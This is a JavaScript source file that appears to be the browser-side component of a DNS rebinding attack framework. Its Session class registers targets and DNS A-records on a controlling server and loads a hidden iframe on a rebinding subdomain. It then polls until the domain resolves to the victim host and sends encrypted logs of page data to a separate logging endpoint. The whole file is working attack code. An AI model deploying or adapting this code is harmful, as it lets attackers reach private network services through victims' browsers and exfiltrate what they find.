import * as crypto from './crypto'
import * as network from './network'

export default class Session {
  constructor () {
    this.sessionId = crypto.randomHex(24)
    this.sessionKey = crypto.xor(this.sessionId, crypto.staticKey)

    // Cross-origin logging endpoint (Access-Control-Allow-Origin: *)
    this.logURL = 'http://' + window.env.address + ':' + window.env.logPort + '/logs'
    // Same-origin endpoint for regular API requests
    this.baseURL = 'http://' + window.location.host
  }

  log (data) {
    const logData = {
      data: data,
      meta: {
        env: window.env,
        args: window.args
      }
    }

    const payload = {}
    payload.s = this.sessionId
    payload.d = btoa(crypto.rc4(this.sessionKey, JSON.stringify(logData)))

    network.postJSON(this.logURL, payload)
  }

  createRebindFrame (address, port, {target, script, fastRebind, args} = {}) {
    target = target || crypto.randomHex(24)
    fastRebind = fastRebind || false
    args = args || {}
    args._rebind = true

    // create the new target
    network.postJSON(this.baseURL + '/targets', {
      target: target,
      script: script || window.env.script,
      fastRebind: fastRebind,
      args: args
    })

    // create the arecord
    network.postJSON(this.baseURL + '/arecords', {
      domain: target + '.' + window.env.domain,
      address: address,
      port: port
    })

    // create the iframe
    const ifrm = document.createElement('iframe')
    ifrm.setAttribute('src', 'http://' + target + '.' + window.env.domain + ':' + port)
    ifrm.style.display = 'none'
    document.body.appendChild(ifrm)
  }

  triggerRebind () {
    return new Promise((resolve, reject) => {
      // update the arecord
      network.postJSON(this.baseURL + '/arecords', {
        domain: window.env.target + '.' + window.env.domain,
        rebind: true
      }, () => {
        // wait for rebinding to occur
        const wait = (time) => {
          network.get(this.baseURL + '/checkpoint', function () {
            // success callback
            // if we're still getting a 200 OK on /checkpoint it means we're
            // doing slow-rebind and we've not yet rebinded
            window.setTimeout(() => {
              wait(time)
            }, time)
          }, function (code) {
            // fail callback

            // if we get an error code of 0 it means we're using fast-rebind
            // and we've not yet rebinded
            if (code === 0) {
              window.setTimeout(() => {
                wait(time)
              }, time)
            } else {
            // if we're getting another error it means we've rebinded
            // (ie: the test path /checkpoint doesn't exist on the host)
              resolve()
            }
          }, function () {
            // timeout callback
          })
        }
        wait(2000)
      })
    })
  }
}
